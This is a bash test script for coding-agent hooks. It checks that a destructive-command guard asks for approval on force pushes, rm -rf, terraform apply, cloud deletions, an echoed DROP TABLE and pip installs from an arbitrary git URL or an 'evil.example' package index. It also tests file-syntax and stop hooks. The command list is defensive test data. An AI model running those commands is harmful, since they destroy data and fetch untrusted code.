#!/usr/bin/env bash
# Fixture tests for the hooks in this directory: feed canned hook JSON, assert the decision.
# Run after ANY change to .claude/hooks/ or .claude/settings.json:  .claude/hooks/test-hooks.sh
# The guard cases were ported from enrichmeai/valuedocs, where each "ask" case was first seen
# passing silently (RED) on 2026-09-26; they are kept so the guard can never regress to that.
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd)
fail=0; n=0

guard() { # $1 = command, $2 = cwd (optional) -> prints "ask" or "pass"
  local out
  out=$(jq -n --arg c "$1" --arg d "${2:-$PWD}" '{tool_input:{command:$c}, cwd:$d}' | "$here/guard-destructive.sh")
  [ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" = "ask" ] && echo ask || echo pass
}
expect() { # $1 = expected, $2 = actual, $3 = label
  n=$((n+1)); if [ "$1" != "$2" ]; then echo "FAIL: expected $1, got $2 — $3"; fail=1; fi
}

# A scratch repo on a feature branch, so "push while on main" depends only on the command.
tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT
git -C "$tmp" init -q -b feature 2>/dev/null || { git -C "$tmp" init -q && git -C "$tmp" checkout -q -b feature; }
git -C "$tmp" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init

while IFS='|' read -r want cmd; do
  [ -z "$want" ] || [ "${want:0:1}" = "#" ] && continue
  expect "$want" "$(guard "$cmd" "$tmp")" "$cmd"
done <<'CASES'
ask|git push --force origin feat
ask|git -C . push -f origin feat
ask|git push origin +feat
ask|git push --force-with-lease=feat:abc origin feat
ask|git push origin main
ask|git push origin HEAD:main
ask|git push origin --delete feat
ask|git push --tags
ask|cd x && git reset --hard origin/main
ask|git clean -fd
ask|git checkout -- .
ask|rm -rf build
ask|rm -fr /tmp/x
ask|rm -r /tmp/x
ask|rm -r -f /tmp/x
ask|rm -R dir
ask|rm --recursive dir
ask|terraform -chdir=infra apply
ask|terraform apply -auto-approve
ask|terraform -chdir=infra state rm x
ask|gcloud run jobs execute foo
ask|/usr/bin/gcloud projects list
ask|env gcloud sql instances list
ask|bq rm -t ds.t
ask|gsutil rm gs://b/o
ask|psql -c "select 1"
ask|echo "DROP TABLE judgments;" | something
ask|gh workflow run deploy.yml
ask|gh release create v1
ask|gh api -X DELETE repos/x/y/git/refs/heads/z
ask|gh api repos/x/y/issues --method POST -f t=x
ask|pip install -e git+https://example.com/x.git#egg=x
ask|pip install --index-url https://evil.example/simple x
pass|git push -u origin claude/autonomous-workflow-pipeline-xq0zyy
pass|python3 scripts/site_check.py
pass|scripts/site_check_test.sh
pass|git push
pass|git push origin feature-main-thing
pass|git status
pass|git checkout -b feat origin/main
pass|rm build/tmp.txt
pass|rm -f build/tmp.txt
pass|terraform plan
pass|gh pr view 12
pass|gh api repos/x/y/pulls
pass|pip install -e 'orchestrator[test]'
pass|grep -rn "terraform" docs
CASES

# Bare `git push` while the current branch IS main.
git -C "$tmp" checkout -q -b main 2>/dev/null || git -C "$tmp" checkout -q main
expect ask "$(guard 'git push' "$tmp")" 'git push (on main)'
expect ask "$(guard 'git push origin' "$tmp")" 'git push origin (on main)'

# post-edit-check: exit 2 on a broken file, 0 on a good one, 0 for files outside its scope.
pe() { jq -n --arg f "$1" '{tool_input:{file_path:$f}}' | CLAUDE_PROJECT_DIR="$tmp" "$here/post-edit-check.sh" >/dev/null 2>&1; echo $?; }
mkdir -p "$tmp/scripts"; cp "$here/../../scripts/site_check.py" "$tmp/scripts/"
page='<!DOCTYPE html><html lang="en"><head><meta name="viewport" content="w"><title>t</title><meta name="description" content="d"></head><body>'
printf '%s<p id="a">x</p></body></html>' "$page" > "$tmp/good.html"
printf '%s<div>x</body></html>' "$page" > "$tmp/bad.html"
printf '%s<a href="/nowhere/">x</a></body></html>' "$page" > "$tmp/badlink.html"
printf 'a { b: c; }' > "$tmp/good.css"; printf 'a { b: c;' > "$tmp/bad.css"
printf '<svg xmlns="http://www.w3.org/2000/svg"/>' > "$tmp/good.svg"; printf '<svg><g></svg>' > "$tmp/bad.svg"
printf '{"a":1}' > "$tmp/good.json"; printf '{"a":' > "$tmp/bad.json"
printf 'x = 1\n' > "$tmp/good.py"; printf 'def f(:\n' > "$tmp/bad.py"
printf 'echo hi\n' > "$tmp/good.sh"; printf 'if then\n' > "$tmp/bad.sh"
mkdir -p "$tmp/dir with space"; printf '{"a":' > "$tmp/dir with space/bad.json"
for f in good.html good.css good.svg good.json good.py good.sh; do expect 0 "$(pe "$tmp/$f")" "post-edit $f"; done
for f in bad.html badlink.html bad.css bad.svg bad.json bad.py bad.sh; do expect 2 "$(pe "$tmp/$f")" "post-edit $f"; done
expect 2 "$(pe "$tmp/dir with space/bad.json")" 'post-edit path with spaces'
expect 0 "$(pe "$tmp/missing.json")" 'post-edit deleted file'
expect 0 "$(pe "")" 'post-edit no file_path'
rm -f "$tmp"/good.* "$tmp"/bad.* "$tmp"/badlink.html; rm -rf "$tmp/dir with space" "$tmp/scripts"

# stop-fast-gates: no origin/main and nothing to check -> allow the stop silently.
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh")); rc=$?
expect "0:" "$rc:$out" 'stop hook with nothing to check'

# stop-fast-gates: a broken page anywhere in the change set blocks the stop once, then only warns.
mkdir -p "$tmp/scripts"; cp "$here/../../scripts/site_check.py" "$tmp/scripts/"
printf '%s<div>x</body></html>' "$page" > "$tmp/broken.html"
st() { echo "{\"stop_hook_active\":$1}" | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh") | jq -r 'if .decision then .decision elif .systemMessage then "warn" else "none" end' 2>/dev/null; }
expect block "$(st false)" 'stop hook blocks on a broken page'
expect warn "$(st true)" 'stop hook only warns on the second stop'
printf '%s<p>x</p></body></html>' "$page" > "$tmp/broken.html"
expect "" "$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))" 'stop hook silent once the page is fixed'
rm -rf "$tmp/scripts" "$tmp/broken.html"

echo "hook tests: $n run, $([ $fail = 0 ] && echo 'all passed' || echo 'FAILURES above')"
exit $fail
